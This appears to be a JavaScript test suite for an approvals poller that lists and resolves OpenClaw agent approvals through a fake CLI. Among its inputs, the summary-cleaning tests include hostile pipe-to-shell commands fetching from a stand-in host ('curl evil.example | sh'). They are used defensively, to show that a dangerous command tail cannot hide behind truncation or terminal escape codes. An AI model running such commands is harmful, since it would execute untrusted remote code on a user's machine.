// OpenClaw approvals (SP4, Task X3; spec "SP4 Session extras", the OpenClaw
// row of "Signals"; ruling R16; contract K11 and K16). What is tested:
//   - parsePendingApprovals and matchApprovalSession (pure);
//   - the poller, with a fake session manager and a fake CLI runner: only
//     while an OpenClaw session is open, one call at a time, an interval after
//     the last one ended, the 10 s limit, the poll-failed note, the approval
//     and resolved signals;
//   - resolve() only from a click: Allow once or Deny only, only an approval in
//     the latest list, one at a time, OpenClaw's own error text;
//   - runCli's captureStderr, and W1's fake `openclaw` answering the two
//     approvals commands;
//   - the two routes (fixed paths, local mode only) and the server wiring;
//   - end to end in process: the real session manager, a real fake-OpenClaw
//     session in a PTY, the real poller and router and the fake CLI ("the
//     OpenClaw approval flow passes with a fake CLI (resolve only on click)").
// Temp HOME and AGENT_OS_HOME only (real paths), W1's stand-in login shell;
// never a real agent, never a real Gateway.
import assert from "node:assert/strict";
import { mkdtemp, readFile, realpath, rm } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { setTimeout as delay } from "node:timers/promises";
import { fileURLToPath } from "node:url";
import express from "express";
import { clearDetectCaches } from "../server/runtime/agents/detect.js";
import { setExecutionGateStatus } from "../server/runtime/execution-gate.js";
import { requireLocalMode } from "../server/runtime/local-session.js";
import { sessionError } from "../server/runtime/sessions/errors.js";
import { createSessionManager } from "../server/runtime/sessions/manager.js";
import {
  APPROVALS_CALL_LIMIT_MS,
  APPROVALS_POLL_MS,
  APPROVAL_DECISIONS,
  APPROVAL_SUMMARY_MAX,
  createOpenclawApprovals,
  matchApprovalSession,
  parsePendingApprovals
} from "../server/runtime/sessions/openclaw-approvals.js";
import { createSessionsRouter } from "../server/runtime/sessions/routes.js";
import { resetLoginShellEnvForTests } from "../server/runtime/sessions/shell-env.js";
import { cleanAlertText } from "../server/runtime/sessions/signals.js";
import { runCli } from "../server/runtime/sessions/soft-stop.js";
import { FAKE_LOGIN_SHELL, makeFakeAgentBin } from "./helpers/fake-agents.js";
import { fakeApproval, pendingJson, setFakeApprovals, setFakeResolve } from "./helpers/fake-approvals.js";
import { NO_GIT_OPTIONS } from "./helpers/no-git.js";
import { sourceProblems } from "./helpers/plan-brains-safety.js";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const isWindows = process.platform === "win32";
const SKIP_POSIX = { skip: isWindows ? "POSIX only: the fake agents are sh shims, and runCli kills process groups" : false };
const SYSTEM_PATH_DIRS = ["/usr/bin", "/bin", "/usr/sbin", "/sbin"];
const S1 = "11111111-1111-4111-8111-111111111111";
const S2 = "22222222-2222-4222-8222-222222222222";
const S3 = "33333333-3333-4333-8333-333333333333";
const HOME = "/Users/someone";
const POLL_FAILED = "Agent OS couldn't read OpenClaw's approvals. Check that the OpenClaw Gateway is running on Agents.";
const INVALID_DECISION = { error: "invalid_decision", message: "Agent OS only sends Allow once or Deny." };
const APPROVAL_MISSING = { error: "approval_missing", message: "That approval isn't waiting anymore." };
const NOT_LOCAL = {
  DEMO_PUBLIC: "1",
  HERMES_AGENT_OS_DEMO_PUBLIC: undefined,
  HERMES_AGENT_OS_REQUIRE_AUTH: undefined,
  HERMES_AGENT_OS_PUBLIC_MODE: undefined
};
const keyOf = (id) => `agent:main:agentos-${id}`;
const listed = (rows) => ({ ok: true, code: 0, aborted: false, stdout: pendingJson(rows) });
const cardOf = (row, sessionId) => ({
  id: row.id,
  kind: row.kind,
  summary: row.summary,
  createdAt: new Date(row.createdAtMs).toISOString(),
  expiresAt: new Date(row.expiresAtMs).toISOString(),
  sessionId
});

async function withEnv(vars, fn) {
  const previous = {};
  for (const key of Object.keys(vars)) previous[key] = process.env[key];
  for (const [key, value] of Object.entries(vars)) {
    if (value === undefined) delete process.env[key];
    else process.env[key] = String(value);
  }
  try {
    return await fn();
  } finally {
    for (const [key, value] of Object.entries(previous)) {
      if (value === undefined) delete process.env[key];
      else process.env[key] = value;
    }
  }
}

async function waitFor(predicate, { timeoutMs = 15000, intervalMs = 20 } = {}) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (await predicate()) return;
    await delay(intervalMs);
  }
  throw new Error("timed out waiting for condition");
}

function isAlive(pid) {
  try {
    process.kill(pid, 0);
    return true;
  } catch (error) {
    return error.code === "EPERM";
  }
}

// The fakes' event log (W1): one JSON line per event.
async function readFakeLog(file) {
  const text = await readFile(file, "utf8").catch((error) => {
    if (error.code === "ENOENT") return "";
    throw error;
  });
  return text
    .split("\n")
    .filter(Boolean)
    .map((line) => JSON.parse(line));
}

async function request(base, method, url, body) {
  const response = await fetch(`${base}${url}`, {
    method,
    headers: { "Content-Type": "application/json" },
    body: body === undefined ? undefined : JSON.stringify(body)
  });
  const text = await response.text();
  let parsed = null;
  try {
    parsed = JSON.parse(text);
  } catch {
    parsed = null;
  }
  return { status: response.status, body: parsed };
}

// The sessions router on a real port, mounted the way server/index.js mounts
// it. The manager is a stand-in: these routes never ask it.
async function withRouterApp(approvals, fn) {
  const app = express();
  app.use(express.json());
  app.use("/api/sessions", requireLocalMode, createSessionsRouter({ manager: { maxLive: 8 }, approvals }));
  const server = await new Promise((resolve) => {
    const listening = app.listen(0, "127.0.0.1", () => resolve(listening));
  });
  const base = `http://127.0.0.1:${server.address().port}`;
  try {
    return await fn((method, url, body) => request(base, method, url, body));
  } finally {
    server.closeAllConnections?.();
    await new Promise((resolve) => server.close(resolve));
  }
}

// The part of the session manager the poller uses (X1a: liveAgentSessions,
// onLiveChange, applySignal), in memory. applySignal records every signal and
// keeps the alert as the activity reducer does for these two kinds; input(id)
// is the person typing in that terminal (it clears the alert).
function fakeManager() {
  const sessions = new Map();
  const listeners = new Set();
  const signals = [];
  const changed = () => {
    for (const listener of [...listeners]) listener();
  };
  return {
    signals,
    liveAgentSessions(agentId = null) {
      return [...sessions.values()]
        .filter((session) => agentId === null || session.agentId === agentId)
        .map((session) => ({
          ...session,
          alert: session.alert ? { ...session.alert } : null,
          profile: { ...session.profile, env: { ...session.profile.env } }
        }));
    },
    onLiveChange(listener) {
      listeners.add(listener);
      return () => {
        listeners.delete(listener);
      };
    },
    applySignal(id, { kind, text = "", source }) {
      const session = sessions.get(id);
      if (!session) return false;
      signals.push({ id, kind, text, source });
      // The real manager cleans the text to ALERT_TEXT_MAX code points (signals.js makeSignal), so the alert holds that.
      if (kind === "approval") session.alert = { kind, text: cleanAlertText(text), at: new Date().toISOString(), source };
      if (kind === "resolved") session.alert = null;
      return true;
    },
    open(id, { agentId = "openclaw" } = {}) {
      sessions.set(id, {
        id,
        agentId,
        agentSessionId: agentId === "openclaw" ? `agentos-${id}` : null,
        folder: HOME,
        status: "live",
        alert: null,
        pid: 4242,
        profile: {
          command: `/fake/bin/${agentId}`,
          args: ["tui", "--session", `agentos-${id}`],
          cwd: HOME,
          env: { PATH: "/usr/bin:/bin", HOME, AGENT_OS_SESSION_ID: id }
        }
      });
      changed();
    },
    close(id) {
      sessions.delete(id);
      changed();
    },
    input(id) {
      const session = sessions.get(id);
      if (session) session.alert = null;
    },
    profileOf(id) {
      return sessions.get(id).profile;
    },
    listenerCount() {
      return listeners.size;
    }
  };
}

// A CLI runner that records every call (argv, options, start and end times)
// and how many ran at once; `answer(args, options, call)` gives the answer.
function fakeCli(answer) {
  const calls = [];
  let running = 0;
  let most = 0;
  async function run(command, args, options = {}) {
    const call = { command, args: [...args], options, startedAt: Date.now(), endedAt: null };
    calls.push(call);
    running += 1;
    most = Math.max(most, running);
    try {
      return await answer(args, options, call);
    } finally {
      running -= 1;
      call.endedAt = Date.now();
    }
  }
  return {
    run,
    calls,
    maxRunning: () => most,
    pending: () => calls.filter((call) => call.args[1] === "pending"),
    resolves: () => calls.filter((call) => call.args[1] === "resolve")
  };
}

// A call that never answers by itself: it ends only when its signal aborts, as runCli does.
function cutOff(_args, { signal }) {
  return new Promise((resolve) => {
    signal.addEventListener("abort", () => resolve({ ok: false, code: null, aborted: true, stdout: "", stderr: "" }), { once: true });
  });
}

test("parsePendingApprovals keeps OpenClaw's fields for every kind, newest first, and drops what Agent OS can't use", () => {
  const now = Date.UTC(2026, 9, 29, 10, 0, 0);
  const row = (extra) => ({ id: "x", kind: "exec", agentId: "main", sessionKey: null, createdAtMs: now - 60000, expiresAtMs: now + 240000, summary: "npm test", ...extra });
  const text = JSON.stringify({
    approvals: [
      row({ id: "appr-old", createdAtMs: now - 120000, sessionKey: keyOf(S1) }),
      row({ id: "appr-new", kind: "plugin", createdAtMs: now - 1000, summary: `Deploy:\tpush\u0007 the site\n${"x".repeat(400)}` }),
      row({ id: "appr-sys", kind: "system-agent", summary: undefined }),
      row({ id: "appr-other", kind: "allowlist" }),
      row({ id: "--help" }),
      row({ id: "has space" }),
      row({ id: 42 }),
      row({ id: "appr-time", createdAtMs: "yesterday" }),
      row({ id: "appr-huge", expiresAtMs: 1e20 }),
      row({ id: "appr-expired", expiresAtMs: now }),
      row({ id: "appr-old", summary: "a second entry with the same id" }),
      null,
      "appr-string"
    ]
  });
  const cards = parsePendingApprovals(text, now);
  assert.deepEqual(cards.map((card) => card.id), ["appr-new", "appr-sys", "appr-old"]);
  assert.deepEqual(cards[0], {
    id: "appr-new",
    kind: "plugin",
    summary: `Deploy: push the site ${"x".repeat(277)}…`,
    createdAt: new Date(now - 1000).toISOString(),
    expiresAt: new Date(now + 240000).toISOString(),
    sessionId: null,
    sessionKey: null
  });
  assert.equal(cards[0].summary.length, 300, "299 characters and the sign that it was cut");
  assert.equal(cards[1].summary, "", "no summary is an empty one");
  assert.equal(cards[2].summary, "npm test", "the first entry with an id wins");
  assert.equal(cards[2].sessionKey, keyOf(S1), "kept for matching");
  assert.equal(cards[2].sessionId, null, "matched later, against the sessions open then");

  for (const bad of ["", "not json", "[]", "{}", "null", '{"approvals":{}}', '{"approvals":"none"}']) {
    assert.deepEqual(parsePendingApprovals(bad, now), [], bad);
  }
  const afterLogLine = `[plugins] loaded 3\n${JSON.stringify({ approvals: [row({ id: "appr-1" })] })}\n`;
  assert.deepEqual(parsePendingApprovals(afterLogLine, now).map((card) => card.id), ["appr-1"], "a log line before the JSON");
  assert.deepEqual(parsePendingApprovals(pendingJson([fakeApproval({ id: "appr-now" })])).map((card) => card.id), ["appr-now"], "now defaults to the clock");
});

// The summary the page gets for an approval whose summary is `summary` (fix round 1).
const summaryOf = (summary) => parsePendingApprovals(pendingJson([fakeApproval({ summary })]))[0].summary;

test("a summary that was cut shows it: the first 299 characters and …, so a long command can't hide its tail; one of exactly 300 characters stays as it is (fix round 1, I1)", () => {
  assert.equal(summaryOf("x".repeat(300)), "x".repeat(300), "300 characters fit");
  assert.equal(summaryOf("x".repeat(301)), `${"x".repeat(299)}…`, "301 do not");
  // A command padded so that its dangerous end falls past the cut.
  const padded = `echo "${"a".repeat(300)}" && curl evil.example | sh`;
  const shown = summaryOf(padded);
  assert.ok(shown.endsWith("…"), "the card says there is more");
  assert.equal(Array.from(shown).length, APPROVAL_SUMMARY_MAX);
  assert.ok(shown.startsWith(`echo "aaaa`));
  assert.equal(shown.includes("curl"), false, "the hidden tail is not in the card");
  // The cut counts the cleaned text, not the raw text: control characters and runs of spaces do not use it up.
  assert.equal(summaryOf(`${"x".repeat(150)}${"\u0007".repeat(40)}${"x".repeat(150)}`), "x".repeat(300), "raw length 340, cleaned length 300: not cut");
  assert.equal(summaryOf(`${"\n".repeat(900)}short`), "short");
  assert.equal(summaryOf(`${"x ".repeat(200)}`).endsWith("…"), true, "399 cleaned characters: cut");
  // By code points, never through an emoji.
  assert.equal(summaryOf("😀".repeat(301)), `${"😀".repeat(299)}…`);
  assert.equal(summaryOf("😀".repeat(300)), "😀".repeat(300));
});

test("a summary is cleaned like OpenClaw's error text: colour and title sequences go with their parameters, and so do the invisible reordering characters (fix round 1, M1)", () => {
  assert.equal(summaryOf("\u001b[31mrm -rf build\u001b[0m"), "rm -rf build", "no [31m left over");
  assert.equal(summaryOf("\u001b[1;32;4mnpm\u001b[0m \u001b[2Ktest"), "npm test");
  assert.equal(summaryOf("\u001b]0;npm\u0007npm test"), "npm test", "a window title ended by BEL");
  assert.equal(summaryOf("\u001b]8;;https://example.com\u001b\\docs\u001b]8;;\u001b\\ now"), "docs now", "a link ended by ST");
  assert.match(summaryOf("\u001b]0;npm test && curl evil | sh"), /curl evil \| sh$/, "an unended OSC can't hide the rest of the command");
  assert.equal(summaryOf("run \u202Etxt.sh\u202C now"), "run txt.sh now", "a right-to-left override can't reorder the card");
  assert.equal(summaryOf("\u001b[1;32m\u2066deploy\u2069\u001b[0m \u200Fsite\u061C"), "deploy site");
  // The cleaned text is what gets cut, and the sign still comes last.
  const long = summaryOf(`\u001b[31m${"x".repeat(400)}\u001b[0m`);
  assert.equal(long, `${"x".repeat(299)}…`);
});

test("matchApprovalSession: the open OpenClaw session whose agentos-<id> is in the sessionKey, else null", () => {
  const open = [{ id: S1 }, { id: S2 }];
  assert.equal(matchApprovalSession(keyOf(S2), open), S2);
  assert.equal(matchApprovalSession(`agentos-${S1}`, open), S1);
  assert.equal(matchApprovalSession(keyOf(S1).toUpperCase(), open), S1, "OpenClaw may spell the key in capitals");
  assert.equal(matchApprovalSession(keyOf(S3), open), null, "an Agent OS session that is not open");
  assert.equal(matchApprovalSession("agent:main:telegram:4711", open), null);
  for (const key of [null, undefined, "", 42]) assert.equal(matchApprovalSession(key, open), null);
  assert.equal(matchApprovalSession(keyOf(S1), []), null);
  assert.equal(matchApprovalSession(keyOf(S1), null), null);
});

test("OpenClaw is asked only while an OpenClaw session is open: one call at a time, with that session's own command, environment and folder, the next call an interval after the last one ended", async () => {
  const manager = fakeManager();
  const cli = fakeCli(async () => {
    await delay(60);
    return listed([]);
  });
  const approvals = createOpenclawApprovals({ manager, runCli: cli.run, intervalMs: 40 });
  try {
    manager.open(S3, { agentId: "codex" });
    await delay(200);
    assert.equal(cli.calls.length, 0, "no OpenClaw session open (a Codex session does not count): no call at all");
    assert.deepEqual(approvals.snapshot(), { approvals: [], error: null });

    manager.open(S1);
    await waitFor(() => cli.calls.filter((call) => call.endedAt).length >= 4);
    manager.open(S2);
    await waitFor(() => cli.calls.filter((call) => call.endedAt).length >= 7);
    assert.equal(cli.maxRunning(), 1, "never two calls at once, also with two OpenClaw sessions open");
    for (const call of cli.calls) {
      assert.equal(call.command, "/fake/bin/openclaw");
      assert.deepEqual(call.args, ["approvals", "pending", "--json"], "never a Gateway address or token");
      assert.deepEqual(call.options.env, manager.profileOf(S1).env, "the session's own environment, never the server's");
      assert.equal(call.options.cwd, HOME);
      assert.ok(call.options.signal instanceof AbortSignal, "every call can be cut off");
    }
    const ended = cli.calls.filter((call) => call.endedAt);
    for (let index = 1; index < ended.length; index += 1) {
      const gap = ended[index].startedAt - ended[index - 1].endedAt;
      assert.ok(gap >= 38, `call ${index} started ${gap} ms after the one before it ended`);
    }

    manager.close(S1);
    manager.close(S2);
    await delay(120);
    const count = cli.calls.length;
    await delay(300);
    assert.equal(cli.calls.length, count, "the last OpenClaw session ended: no more calls");
    assert.deepEqual(approvals.snapshot(), { approvals: [], error: null });
  } finally {
    await approvals.stop();
  }
  assert.deepEqual([APPROVALS_POLL_MS, APPROVALS_CALL_LIMIT_MS], [3000, 10000], "the defaults: every 3 s, 10 s each (R16)");
});

test("each call is cut off at its limit; a poll that fails, is cut off or prints something else shows the poll-failed note, keeps the last good list and changes no alert, and the next good poll clears the note", async () => {
  const manager = fakeManager();
  manager.open(S1);
  const row = fakeApproval({ id: "appr-a", sessionKey: keyOf(S1), summary: "rm -rf build" });
  const script = [
    () => listed([row]),
    cutOff,
    () => ({ ok: false, code: 1, aborted: false, stdout: "" }),
    () => ({ ok: true, code: 0, aborted: false, stdout: "Gateway: hello" }),
    () => listed([row])
  ];
  // The list at the start of each call: what the call before it left.
  const seen = [];
  let approvals = null;
  const cli = fakeCli(async (args, options, call) => {
    const index = cli.calls.indexOf(call);
    seen.push(approvals.snapshot());
    return (script[index] ?? script.at(-1))(args, options);
  });
  approvals = createOpenclawApprovals({ manager, runCli: cli.run, intervalMs: 20, limitMs: 60 });
  try {
    await waitFor(() => seen.length >= 6);
    const card = cardOf(row, S1);
    assert.deepEqual(seen.slice(0, 6), [
      { approvals: [], error: null },
      { approvals: [card], error: null },
      { approvals: [card], error: POLL_FAILED },
      { approvals: [card], error: POLL_FAILED },
      { approvals: [card], error: POLL_FAILED },
      { approvals: [card], error: null }
    ]);
    const cut = cli.calls[1];
    assert.equal(cut.options.signal.aborted, true, "the call was cut off");
    const took = cut.endedAt - cut.startedAt;
    assert.ok(took >= 50 && took < 1000, `${took} ms`);
    assert.deepEqual(manager.signals, [{ id: S1, kind: "approval", text: "rm -rf build", source: "openclaw" }], "a failed poll neither resolves nor repeats the alert");
  } finally {
    await approvals.stop();
  }
});

test("a matched approval alerts only its own session and an unmatched one every open OpenClaw session (its card has no session); each approval alerts a session once, and the alert resolves when nothing is pending for it", async () => {
  const manager = fakeManager();
  manager.open(S1);
  manager.open(S2);
  const t = Date.now();
  const a = fakeApproval({ id: "appr-a", sessionKey: keyOf(S1), summary: "npm run deploy", createdAtMs: t - 2000, expiresAtMs: t + 300000 });
  const b = fakeApproval({ id: "appr-b", kind: "plugin", sessionKey: "agent:main:telegram:4711", summary: "Browser: open example.com", createdAtMs: t - 1000, expiresAtMs: t + 300000 });
  const polls = [[a], [a], [b, a], [b, a], [], []];
  // At the start of each call: the signals so far and the list, as the poll before it left them.
  const before = [];
  let approvals = null;
  const cli = fakeCli(async (_args, _options, call) => {
    const index = cli.calls.indexOf(call);
    if (index === 3) manager.input(S1); // the person types in S1's terminal
    before.push({ signals: manager.signals.length, cards: approvals.snapshot().approvals });
    return listed(polls[Math.min(index, polls.length - 1)]);
  });
  approvals = createOpenclawApprovals({ manager, runCli: cli.run, intervalMs: 20 });
  try {
    await waitFor(() => before.length >= polls.length + 1);
    assert.deepEqual(manager.signals, [
      { id: S1, kind: "approval", text: "npm run deploy", source: "openclaw" },
      { id: S1, kind: "approval", text: "Browser: open example.com", source: "openclaw" },
      { id: S2, kind: "approval", text: "Browser: open example.com", source: "openclaw" },
      { id: S2, kind: "resolved", text: "", source: "openclaw" }
    ]);
    assert.deepEqual(
      before.slice(0, 7).map((entry) => entry.signals),
      [0, 1, 1, 3, 3, 4, 4],
      "poll 1: S1; poll 3: the new unmatched one for both; poll 4 after S1's input: nothing again; poll 5: S2 resolves (S1's alert is already gone)"
    );
    assert.deepEqual(before[3].cards, [cardOf(b, null), cardOf(a, S1)], "newest first; the unmatched card has no session");
    assert.deepEqual(before[6].cards, []);
    assert.deepEqual(cli.resolves(), [], "nothing was answered");
  } finally {
    await approvals.stop();
  }
});

test("resolve sends only Allow once or Deny, only for an approval in the latest list and one at a time; it runs `openclaw approvals resolve <id> <decision>` once and asks for the list again at once", async () => {
  const manager = fakeManager();
  manager.open(S1);
  const row = fakeApproval({ id: "appr-r1", sessionKey: keyOf(S1) });
  // The module's own clock is injected (sweep A item 3): appr-old runs out when the test says so, not after
  // 600 real milliseconds, so a slow machine can't make it vanish before the re-poll that has to list it.
  let clock = Date.now();
  const expiring = fakeApproval({ id: "appr-old", expiresAtMs: clock + 600 });
  let release = null;
  const cli = fakeCli(async (args) => {
    if (args[1] === "pending") return listed([row, expiring]);
    if (args[3] === "deny") await new Promise((resolve) => (release = resolve));
    return { ok: true, code: 0, aborted: false, stdout: `resolved ${args[2]} ${args[3]}\n`, stderr: "" };
  });
  const approvals = createOpenclawApprovals({ manager, runCli: cli.run, intervalMs: 60000, now: () => clock });
  try {
    await waitFor(() => approvals.snapshot().approvals.length === 2);
    assert.equal(cli.pending().length, 1, "one poll so far: the next one is a minute away");

    for (const decision of ["allow-always", "Allow once", "", undefined, null, 1, ["deny"]]) {
      await assert.rejects(approvals.resolve("appr-r1", decision), { status: 400, code: INVALID_DECISION.error, message: INVALID_DECISION.message });
    }
    for (const id of ["appr-nope", "", undefined, 42, { id: "appr-r1" }]) {
      await assert.rejects(approvals.resolve(id, "allow-once"), { status: 404, code: APPROVAL_MISSING.error, message: APPROVAL_MISSING.message });
    }
    assert.equal(cli.resolves().length, 0, "nothing was sent for a refused answer");

    assert.deepEqual(await approvals.resolve("appr-r1", "allow-once"), { message: null });
    const [sent] = cli.resolves();
    assert.equal(sent.command, "/fake/bin/openclaw");
    assert.deepEqual(sent.args, ["approvals", "resolve", "appr-r1", "allow-once"]);
    assert.deepEqual(sent.options.env, manager.profileOf(S1).env);
    assert.equal(sent.options.cwd, HOME);
    assert.equal(sent.options.captureStderr, true);
    assert.ok(sent.options.signal instanceof AbortSignal);
    // The re-poll runs at once; this fake OpenClaw still lists the approval, so it is back when the poll lands
    // (until then it is off the list: the M2 test below).
    await waitFor(() => cli.pending().length === 2 && approvals.snapshot().approvals.length === 2, { timeoutMs: 1000 });

    // One at a time per approval (K16).
    const first = approvals.resolve("appr-r1", "deny");
    await waitFor(() => release !== null);
    await assert.rejects(approvals.resolve("appr-r1", "allow-once"), {
      status: 409,
      code: "approval_busy",
      message: "Agent OS is already sending your answer to this approval."
    });
    // An approval past its expiry is not waiting any more: the clock moves past appr-old's time (appr-r1 has minutes left).
    // (The Deny took appr-r1 off the list at once, so first the re-poll lists it again, and then appr-old is gone.)
    clock += 1000;
    release();
    assert.deepEqual(await first, { message: null });
    await waitFor(() => approvals.snapshot().approvals.map((card) => card.id).join() === "appr-r1");
    assert.deepEqual(approvals.snapshot().approvals.map((card) => card.id), ["appr-r1"]);
    await assert.rejects(approvals.resolve("appr-old", "deny"), { status: 404, code: "approval_missing" });
    // No OpenClaw session open: nothing is waiting.
    manager.close(S1);
    await assert.rejects(approvals.resolve("appr-r1", "deny"), { status: 404, code: "approval_missing" });
    assert.deepEqual(cli.resolves().map((call) => call.args[3]), ["allow-once", "deny"], "only the two clicks were sent");
  } finally {
    await approvals.stop();
  }
});

test("a resolve that went through takes its card off the list at once: a repeat click answers approval_missing and the CLI gets one resolve call (fix round 1, M2)", async () => {
  const manager = fakeManager();
  manager.open(S1);
  const row = fakeApproval({ id: "appr-m2", sessionKey: keyOf(S1) });
  let hold = null; // while set, a poll waits for it: the re-poll that would list the approval again
  const cli = fakeCli(async (args) => {
    if (args[1] === "pending") {
      if (hold) await hold;
      return listed([row]);
    }
    return { ok: true, code: 0, aborted: false, stdout: "resolved\n", stderr: "" };
  });
  const approvals = createOpenclawApprovals({ manager, runCli: cli.run, intervalMs: 60000 });
  try {
    await waitFor(() => approvals.snapshot().approvals.length === 1);
    let release = () => {};
    hold = new Promise((resolve) => (release = resolve));
    // Two quick clicks: the second meets the first one still running (K16).
    const [first, second] = await Promise.allSettled([approvals.resolve("appr-m2", "allow-once"), approvals.resolve("appr-m2", "deny")]);
    assert.deepEqual(first, { status: "fulfilled", value: { message: null } });
    assert.equal(second.status, "rejected");
    assert.equal(second.reason.code, "approval_busy");
    assert.deepEqual(approvals.snapshot().approvals, [], "off the list at once, before the re-poll answers");
    await waitFor(() => cli.pending().length === 2, { timeoutMs: 1000 });
    // A third click while that poll is still out: nothing is waiting any more.
    await assert.rejects(approvals.resolve("appr-m2", "deny"), { status: 404, code: APPROVAL_MISSING.error, message: APPROVAL_MISSING.message });
    assert.equal(cli.resolves().length, 1, "one resolve call in all");
    assert.deepEqual(cli.resolves()[0].args, ["approvals", "resolve", "appr-m2", "allow-once"]);
    release();
  } finally {
    await approvals.stop();
  }
});

test("a resolve that ends while a poll is running asks for exactly one more poll right after that one, not an interval later (fix round 1, M4: the pollAgain path)", async () => {
  const manager = fakeManager();
  manager.open(S1);
  const one = fakeApproval({ id: "appr-p1", sessionKey: keyOf(S1) });
  const two = fakeApproval({ id: "appr-p2", sessionKey: keyOf(S1) });
  let hold = null;
  const cli = fakeCli(async (args) => {
    if (args[1] === "pending") {
      if (hold) await hold;
      return listed([one, two]);
    }
    return { ok: true, code: 0, aborted: false, stdout: "resolved\n", stderr: "" };
  });
  const approvals = createOpenclawApprovals({ manager, runCli: cli.run, intervalMs: 60000 });
  try {
    await waitFor(() => approvals.snapshot().approvals.length === 2);
    let release = () => {};
    hold = new Promise((resolve) => (release = resolve));
    await approvals.resolve("appr-p1", "allow-once"); // its own re-poll starts and is held
    await waitFor(() => cli.pending().length === 2, { timeoutMs: 1000 });
    await approvals.resolve("appr-p2", "deny"); // ends while that poll is out
    assert.equal(cli.pending().length, 2, "no third poll while one is running");
    hold = null;
    release();
    await waitFor(() => cli.pending().length === 3, { timeoutMs: 1000 });
    await delay(250);
    assert.equal(cli.pending().length, 3, "exactly one more, and the next one is an interval (a minute) away");
    const polls = cli.pending();
    assert.ok(polls[2].startedAt >= polls[1].endedAt, "the extra poll starts after the one that was running ended: polls never overlap");
  } finally {
    await approvals.stop();
  }
});

test("resolving an approval that belongs to no session uses the first open OpenClaw session's command and environment; a matched one uses its own session's (fix round 1, M4)", async () => {
  const manager = fakeManager();
  manager.open(S1);
  manager.open(S2);
  const loose = fakeApproval({ id: "appr-u1", sessionKey: "agent:main:telegram:4711" });
  const mine = fakeApproval({ id: "appr-u2", sessionKey: keyOf(S2) });
  const cli = fakeCli(async (args) =>
    args[1] === "pending" ? listed([loose, mine]) : { ok: true, code: 0, aborted: false, stdout: "resolved\n", stderr: "" }
  );
  const approvals = createOpenclawApprovals({ manager, runCli: cli.run, intervalMs: 60000 });
  try {
    await waitFor(() => approvals.snapshot().approvals.length === 2);
    assert.deepEqual(
      Object.fromEntries(approvals.snapshot().approvals.map((card) => [card.id, card.sessionId])),
      { "appr-u1": null, "appr-u2": S2 },
      "the loose one has no session, the other is S2's"
    );
    await approvals.resolve("appr-u1", "deny");
    await approvals.resolve("appr-u2", "allow-once");
    const [first, second] = cli.resolves();
    assert.deepEqual(first.args, ["approvals", "resolve", "appr-u1", "deny"]);
    assert.equal(first.command, "/fake/bin/openclaw");
    assert.deepEqual(first.options.env, manager.profileOf(S1).env, "no session of its own: the first open OpenClaw session's environment");
    assert.equal(first.options.env.AGENT_OS_SESSION_ID, S1);
    assert.deepEqual(second.args, ["approvals", "resolve", "appr-u2", "allow-once"]);
    assert.deepEqual(second.options.env, manager.profileOf(S2).env, "a matched approval: its own session's environment");
    assert.equal(second.options.env.AGENT_OS_SESSION_ID, S2);
  } finally {
    await approvals.stop();
  }
});

test("the newest approval leaves while an older one of the session is still pending: the alert names the one that is left, once; user input still silences it, and a long summary does not alert on every poll (fix round 1, M3)", async () => {
  const manager = fakeManager();
  manager.open(S1);
  manager.open(S2);
  const t = Date.now();
  const a = fakeApproval({ id: "appr-a", sessionKey: keyOf(S1), summary: "npm run deploy", createdAtMs: t - 2000, expiresAtMs: t + 300000 });
  const b = fakeApproval({ id: "appr-b", sessionKey: keyOf(S1), summary: "git push origin main", createdAtMs: t - 1000, expiresAtMs: t + 300000 });
  // S2 has one approval with a long summary all the time: its alert holds the first 200 characters, and that must count as the same.
  const long = fakeApproval({ id: "appr-long", sessionKey: keyOf(S2), summary: `deploy ${"y".repeat(400)}`, createdAtMs: t - 3000, expiresAtMs: t + 300000 });
  const polls = [[b, a, long], [b, a, long], [a, long], [a, long], [a, long], [long]];
  const before = [];
  let approvals = null;
  const cli = fakeCli(async (_args, _options, call) => {
    const index = cli.calls.indexOf(call);
    if (index === 4) manager.input(S1); // the person types in S1's terminal
    before.push(manager.signals.filter((signal) => signal.id === S1).length);
    return listed(polls[Math.min(index, polls.length - 1)]);
  });
  approvals = createOpenclawApprovals({ manager, runCli: cli.run, intervalMs: 20 });
  try {
    await waitFor(() => before.length >= polls.length + 1);
    assert.deepEqual(
      manager.signals.filter((signal) => signal.id === S1),
      [
        { id: S1, kind: "approval", text: "git push origin main", source: "openclaw" },
        { id: S1, kind: "approval", text: "npm run deploy", source: "openclaw" }
      ],
      "b alerts first; when b leaves, the alert names a; a third poll, the input and the empty list add nothing"
    );
    assert.deepEqual(before.slice(0, 7), [0, 1, 1, 2, 2, 2, 2], "the second signal comes with the poll that dropped b");
    assert.equal(manager.signals.filter((signal) => signal.id === S2 && signal.kind === "approval").length, 1, "S2's long summary alerts once");
    assert.equal(manager.signals.some((signal) => signal.kind === "resolved" && signal.id === S1), false, "S1's alert was already gone: nothing to resolve");
  } finally {
    await approvals.stop();
  }
});

test("a refused answer comes back as plain text: OpenClaw's own words from stderr, else stdout, without colour codes and cut to 300 characters; no words, or no answer in time, get their own sentence", async () => {
  const manager = fakeManager();
  manager.open(S1);
  const row = fakeApproval({ id: "appr-e1", sessionKey: keyOf(S1) });
  let next = null;
  const cli = fakeCli(async (args, options) => (args[1] === "pending" ? listed([row]) : next(args, options)));
  const approvals = createOpenclawApprovals({ manager, runCli: cli.run, intervalMs: 60000, limitMs: 80 });
  const refusal = (fields) => () => ({ ok: false, code: 1, aborted: false, stdout: "", stderr: "", ...fields });
  try {
    await waitFor(() => approvals.snapshot().approvals.length === 1);
    const cases = [
      [refusal({ stderr: "\x1b[31mError:\x1b[0m approval expired\n" }), "OpenClaw didn't take that answer: Error: approval expired"],
      [refusal({ stderr: "not allowed for this approval", stdout: "ignored" }), "OpenClaw didn't take that answer: not allowed for this approval"],
      [refusal({ stdout: "conflicting decision\r\n" }), "OpenClaw didn't take that answer: conflicting decision"],
      [refusal({ stderr: "  \n" }), "OpenClaw didn't take that answer and gave no reason."],
      [refusal({ stderr: "x".repeat(1000) }), `OpenClaw didn't take that answer: ${"x".repeat(299)}\u2026`],
      [
        () => {
          throw new Error("spawn EAGAIN");
        },
        "OpenClaw didn't take that answer and gave no reason."
      ],
      [cutOff, "OpenClaw didn't answer in time, so Agent OS can't tell whether your answer arrived."]
    ];
    for (const [answer, message] of cases) {
      next = answer;
      await assert.rejects(approvals.resolve("appr-e1", "deny"), { status: 409, code: "approval_failed", message });
    }
